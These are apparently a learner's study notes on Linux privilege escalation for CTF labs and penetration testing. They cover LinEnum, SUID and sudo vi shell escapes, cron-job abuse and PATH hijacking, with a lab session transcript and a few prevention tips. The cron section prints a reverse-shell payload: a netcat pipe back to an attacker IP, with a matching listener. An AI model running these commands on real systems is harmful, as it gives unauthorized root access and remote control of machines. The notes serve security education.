Privilege Escalation usually involves going from a lower permission to a higher permission
This allow you to do many things, including:

-  Reset passwords  
-  Bypass access controls to compromise protected data
-  Edit software configurations
-  Enable persistence, so you can access the machine again later.
-  Change privilege of users
-  Get that cheeky root flag ;)![[Pasted image 20250306233239.png]]

**What is LinEnum?**

LinEnum is a simple bash script that performs common commands related to privilege escalation, saving time and allowing more effort to be put toward getting root.
[https://github.com/rebootuser/LinEnum/blob/master/LinEnum.sh](https://github.com/rebootuser/LinEnum/blob/master/LinEnum.sh)

**How do I get LinEnum on the target machine?**

There are two ways to get LinEnum on the target machine. The first way, is to go to the directory that you have your local copy of LinEnum stored in, and start a Python web server using **"python3 -m http.server 8000"** [1]. Then using **"wget"** on the target machine, and your local IP, you can grab the file from your local machine [2]. Then make the file executable using the command **"chmod +x FILENAME.sh"**.

![[Pasted image 20250306233836.png]]![[Pasted image 20250306233842.png]]

**Other Methods**

In case you're unable to transport the file, you can also, if you have sufficient permissions, copy the raw LinEnum code from your local machine [1] and paste it into a new file on the target, using Vi or Nano [2]. Once you've done this, you can save the file with the **".sh"** extension. Then make the file executable using the command **"chmod +x FILENAME.sh"**. You now have now made your own executable copy of the LinEnum script on the target machine!
![[Pasted image 20250306234022.png]]![[Pasted image 20250306234031.png]]

**Running LinEnum**

LinEnum can be run the same way you run any bash script, go to the directory where LinEnum is and run the command **"./LinEnum.sh"**.

**Understanding LinEnum Output**

The LinEnum output is broken down into different sections, these are the main sections that we will focus on:

_Kernel_ Kernel information is shown here. There is most likely a kernel exploit available for this machine.

_Can we read/write sensitive files:_ The world-writable files are shown below. These are the files that any authenticated user can read and write to. By looking at the permissions of these sensitive files, we can see where there is misconfiguration that allows users who shouldn't usually be able to, to be able to write to sensitive files.

_SUID Files:_ The output for SUID files is shown here. There are a few interesting items that we will definitely look into as a way to escalate privileges. SUID (Set owner User ID up on execution) is a special type of file permissions given to a file. It allows the file to run with permissions of whoever the owner is. If this is root, it runs with root permissions. It can allow us to escalate privileges. 

_Crontab_ _Contents**:**_ The scheduled cron jobs are shown below. Cron is used to schedule commands at a specific time. These scheduled commands or tasks are known as “cron jobs”. Related to this is the crontab command which creates a crontab file containing commands and instructions for the cron daemon to execute. There is certainly enough information to warrant attempting to exploit Cronjobs here.

- to know hostname: hostname command
- available shells: cat /etc/shells
- to check cron job: cat /etc/crontab
- file permissions: ls -l filename

## Abusing SUID/GUID Files
### What is SUID Binary
In Linux everything is a file, including directories and devices which have permissions to allow or restrict three operations i.e. read/write/execute.
Take a look at the following demonstration of how maximum privileges (rwx-rwx-rwx) look:

r = read

w = write

x = execute  

    **user**     **group**     **others**  

    rwx       rwx       rwx  

    _421       421       421_
   The maximum number of bit that can be used to set permission for each user is 7, which is a combination of read (4) write (2) and execute (1) operation. For example, if you set permissions using **"chmod"** as **755**, then it will be: rwxr-xr-x.
   Therefore, the permissions to look for when looking for SUID is:

SUID:

rws-rwx-rwx

GUID:

rwx-rws-rwx


###  Finding SUID Binaries
**find / -perm -u=s -type f 2>/dev/null**
**find** - Initiates the "find" command  

**/** - Searches the whole file system  

**-perm** - searches for files with specific permissions  

**-u=s** - Any of the permission bits _mode_ are set for the file. Symbolic modes are accepted in this form

**-type f** - Only search for files  

**2>/dev/null** - Suppresses errors
 istead of -u=s or -g=s, 4000 and 2000 can be used.


## Exploiting /etc/passwd

- Seven fields are allowed.
- test:x:0:0:root:/root:/bin/bash

[as divided by colon (:)]  

1. **Username**: It is used when user logs in. It should be between 1 and 32 characters in length.
2. **Password**: An x character indicates that encrypted password is stored in /etc/shadow file. Please note that you need to use the passwd command to compute the hash of a password typed at the CLI or to store/update the hash of the password in /etc/shadow file, in this case, the password hash is stored as an "x".  
3. **User ID (UID)**: Each user must be assigned a user ID (UID). UID 0 (zero) is reserved for root and UIDs 1-99 are reserved for other predefined accounts. Further UID 100-999 are reserved by system for administrative and system accounts/groups.
4. **Group ID (GID)**: The primary group ID (stored in /etc/group file)
5. **User ID Info**: The comment field. It allow you to add extra information about the users such as user’s full name, phone number etc. This field use by finger command.
6. **Home directory**: The absolute path to the directory the user will be in when they log in. If this directory does not exists then users directory becomes /
7. **Command/shell**: The absolute path of a command or shell (/bin/bash). Typically, this is a shell. Please note that it does not have to be a shell.
### **Privilege Escalation with `sudo -l` and Misconfigured Binaries**

### **1. What is `sudo -l`?**

When you have access to a user account in a **CTF (Capture The Flag) scenario** or a **penetration test**, the command:

```bash
sudo -l
```

**Lists commands** that the user can run with `sudo` (as root or another user).

- If a command **can be run without a password**, it might allow privilege escalation.
- Example output:
    
    ```
    (ALL) NOPASSWD: /usr/bin/vi
    ```
    
    This means the user can **run `vi` as root without needing a password**.

---

### **2. Escaping `vi` to Get Root Access**

If `vi` (or `vim`) can be run as root, you can **break out into a root shell**.

#### **Steps:**

1. Run `vi` as root:
    
    ```bash
    sudo vi
    ```
    
2. Inside `vi`, enter **command mode** by pressing `:` (colon).
3. Run a shell command:
    
    ```
    :!bash
    ```
    
    or
    
    ```
    :!/bin/sh

	```
    or :!sh
4. If successful, you will get a **root shell (`#` prompt)**. Confirm with:
    
    ```bash
    whoami
    ```
    
    If it returns `root`, you have successfully escalated privileges!

---

### **3. GTFOBins & Misconfigured Binaries**

- **GTFOBins** is a website that lists Unix binaries that can be used to **escalate privileges**.
- If you find a **misconfigured binary** (like `vi`, `awk`, `perl`, etc.) using `sudo -l`, check **GTFOBins** for exploitation methods.
- GTFOBins provides **ready-to-use** privilege escalation commands.
- Website: [https://gtfobins.github.io](https://gtfobins.github.io)

---

### **4. How to Prevent This Vulnerability?**

- Restrict `sudo` access to **only necessary commands**.
- Use **least privilege** (`sudo -u` for specific users).
- Disable shell escapes in `vi` using:
    
    ```bash
    export SHELL=/usr/sbin/nologin
    ```
    
find / -perm -4000 -type f 2>/dev/null  # Find SUID files
find / -perm -2000 -type f 2>/dev/null  # Find SGID files


# **Exploiting Crontab**

**Daemon :** A background process that runs continuously on linux without user interaction.
- Usually ends with a **d** (e.g. sshd, crond).
- Manages system services (eg. systemd, httpd).
- Often run as the root or a specific user.

**What is Cron?**  

The Cron daemon is a long-running process that executes commands at specific dates and times. You can use this to schedule activities, either as one-time events or as recurring tasks. You can create a crontab file containing commands and instructions for the Cron daemon to execute.

- Use the command **cat /etc/crontab** to view what cron jobs are scheduled. 


## Crontab Format
 # =  ID
 m = Minute
 h = hour
 dom = Day of the Month
 mon = Month
 dow = Day of the week
 user = what user the command will run as
 command = what command should be run
 - eg: **# m h dom mon dow user command**
 - **17  * 1 * * * root cd/&&run-parts--report/etc/cron.hourly**
### **Cron Job Exploit for Root Access **


#### **1. Generate Reverse Shell Payload**

```bash
msfvenom -p cmd/unix/reverse_netcat LHOST=<your-ip> LPORT=8888
```

- Example output:
    
    ```bash
    mkfifo /tmp/lifb; nc <your-ip> 8888 0</tmp/lifb | /bin/sh >/tmp/lifb 2>&1; rm /tmp/lifb
    ```
    

#### **2. Inject Payload into a Cron-Executed Script**

```bash
echo '[MSFVENOM OUTPUT]' > autoscript.sh
```

- If `autoscript.sh` is run by cron **as root**, it will execute our payload with root privileges.

#### **3. Start Netcat Listener on Attacker Machine**

```bash
nc -lvnp 8888
```

- This listens for the reverse shell connection.

#### **4. Wait for Cron to Execute the Script (~5 mins)**

- If the cron job executes `autoscript.sh` as **root**, the reverse shell will connect back to us.
- Once executed, we get a **root shell**.

#### **5. Verify Root Access**

```bash
whoami
id
```

- Expected output:
    
    ```bash
    root
    uid=0(root) gid=0(root) groups=0(root)
    ```
    

---

### **Why This Works?**

- **Misconfigured cron jobs** allow writable scripts to be modified by non-root users.
- **Privilege Escalation** occurs when cron executes the modified script as **root**.


# Exploiting PATH Variable

**what is PATH**
- `PATH` is an **environment variable** that tells the shell **where to look** for executable files when a command is run.
- It specifies directories that hold executable programs.
- To view path: **echo $PATH**.

### **Privilege Escalation Using `$PATH` Manipulation in SUID Binaries**

If an **SUID binary** runs a system command **without specifying its full path**, we can trick it into executing our **malicious command** instead of the real one, gaining **root privileges**.

---

### **Steps to Exploit `$PATH` in an SUID Binary**

#### **1. Find an SUID Binary**

SUID binaries run with the owner's privileges (e.g., root). We can list them with:

```bash
find / -perm -4000 -user root 2>/dev/null
```

If we find an SUID binary like `/usr/bin/vuln`, we check if it calls a system command without specifying the full path.

#### **2. Check if It Calls a System Command**

Run the binary:

```bash
/usr/bin/vuln
```

If it executes a common command (e.g., `ps`), but does **not use the full path** (e.g., `/bin/ps`), we can exploit it.

#### **3. Create a Fake Version of the Command**

We create a fake **`ps`** command that actually starts a root shell:

```bash
echo '#!/bin/bash' > ps
echo 'bash -p' >> ps  # -p preserves SUID privileges
chmod +x ps
```

#### **4. Modify `$PATH` to Point to Our Fake Command**

We place our fake `ps` script in a directory **before** system directories in `$PATH`:

```bash
export PATH=/tmp:$PATH  # This makes the system look in /tmp first
mv ps /tmp/             # Move our fake script to /tmp
```

#### **5. Run the SUID Binary**

```bash
/usr/bin/vuln
```

Since it searches for `ps` in `$PATH`, it finds **our fake script** in `/tmp` **instead of the real `/bin/ps`**, running it **as root**.

#### **6. Get a Root Shell**

If successful, we now have a **root shell**:

```bash
whoami
root
```

---

### **Why This Works?**

- The SUID binary runs with **root privileges**.
- It calls `ps` **without specifying the full path**.
- `$PATH` determines **which `ps` command** is executed.
- By **changing `$PATH`**, we make it run **our fake script**, which launches a **root shell**.

---

### **How to Prevent This?**

**Use full paths** in SUID binaries (`system("/bin/ps")` instead of `system("ps")`).  
 **Restrict SUID permissions** (`chmod u-s /path/to/binary`).  
**Check `$PATH` for unsafe directories** (`echo $PATH`).

---


### **Privilege Escalation via PATH Manipulation - Step-by-Step Explanation**

In this process, we **exploited an SUID binary (`script`) using PATH variable manipulation** to gain **root access**. Below is a **detailed breakdown** of each step and what it accomplished.

---

## **Step 1: Running the `script` Binary**

```bash
user5@polobox:~$ ./script
Desktop    Downloads  Pictures	script	   Videos
Documents  Music      Public	Templates
```

- We executed the **`script` binary**.
- The output suggests it ran the `ls` command because it displayed the contents of the home directory.

---

## **Step 2: Checking the `$PATH` Environment Variable**

```bash
user5@polobox:/tmp$ echo $PATH
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games
```

- **`$PATH` defines the directories where the system searches for executables** when we run a command.
- The default `$PATH` includes `/usr/bin`, `/bin`, etc., meaning commands like `ls` will be run from `/bin/ls`.

---

## **Step 3: Attempting to Override `ls`**

```bash
user5@polobox:/tmp$ echo "/bin/bash" > ls
user5@polobox:/tmp$ chmod +x ls
```

- We **created a fake `ls` command** in the `/tmp` directory.
- `echo "/bin/bash" > ls` → Created a script that executes `/bin/bash` (spawns a shell).
- `chmod +x ls` → Made it **executable**.

---

## **Step 4: Modifying the `$PATH` Variable**

```bash
user5@polobox:/tmp$ export PATH=/tmp:$PATH
user5@polobox:/tmp$ echo $PATH
/tmp:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games
```

- **We changed `$PATH` to prioritize `/tmp`** before system directories.
- Now, if a program calls `ls` **without specifying its full path**, it will execute our fake `ls` instead of `/bin/ls`.

---

## **Step 5: Running the `script` Binary Again**

```bash
user5@polobox:~$ ./script
Welcome to Linux Lite 4.4 user5
 
Friday 21 March 2025, 14:41:52
Memory Usage: 346/1991MB (17.38%)
Disk Usage: 6/217GB (3%)
Support - https://www.linuxliteos.com/forums/ (Right click, Open Link)
 
root@polobox:~#  
```

- This time, when `script` ran, **it executed `ls`**.
- Since `ls` was our **malicious script** (`/bin/bash`), it launched a **root shell** instead.

---

## **Why Did This Work?**

1. **The `script` binary is SUID (SetUID)** → It runs with the **privileges of its owner** (likely root).
2. **`script` calls `ls` without using the full path (`/bin/ls`)**.
3. **We injected our own `ls` into `$PATH`**, making the SUID program execute our **malicious shell** instead.
4. **Since `script` was running as root**, our fake `ls` executed `/bin/bash` **as root**, giving us a **root shell**.

---

## **Final Takeaway**

- **SUID binaries** should **always** use full paths (`/bin/ls` instead of `ls`) to avoid `$PATH` manipulation attacks.
- **PATH hijacking** is a common privilege escalation technique in Linux.

---


**Linux Privilege Escalation** checklists and guides commonly used in **Capture The Flag (CTF) challenges** and **penetration testing**. They help identify **misconfigurations, vulnerable binaries, and security weaknesses** that can be exploited to escalate privileges (e.g., gaining root access).

### **Breakdown of Each Resource:**

1. **[Linux Privilege Escalation - netbiosX](https://github.com/netbiosX/Checklists/blob/master/Linux-Privilege-Escalation.md)**
    
    - A checklist for **system enumeration and privilege escalation techniques**.
    - Covers **SUID, misconfigured permissions, kernel exploits, cron jobs, PATH hijacking**, etc.
2. **[PayloadsAllTheThings - Linux Privilege Escalation](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md)**
    
    - A **collection of exploits, payloads, and methodologies** for privilege escalation.
    - Useful for **CTF players, ethical hackers, and pentesters**.
3. **[Total OSCP Guide - Linux Privilege Escalation](https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_-_linux.html)**
    
    - Focused on **Offensive Security Certified Professional (OSCP) exam preparation**.
    - Lists **commands, tools, and techniques** to escalate privileges in Linux environments.
4. **[Payatu - Linux Privilege Escalation Guide](https://payatu.com/blog/a-guide-to-linux-privilege-escalation/)**
    
    - Detailed **blog post** explaining **common privilege escalation techniques** with **real-world examples**.
    - Covers **exploiting weak configurations, binary exploits, kernel vulnerabilities**, and **practical attack scenarios**.
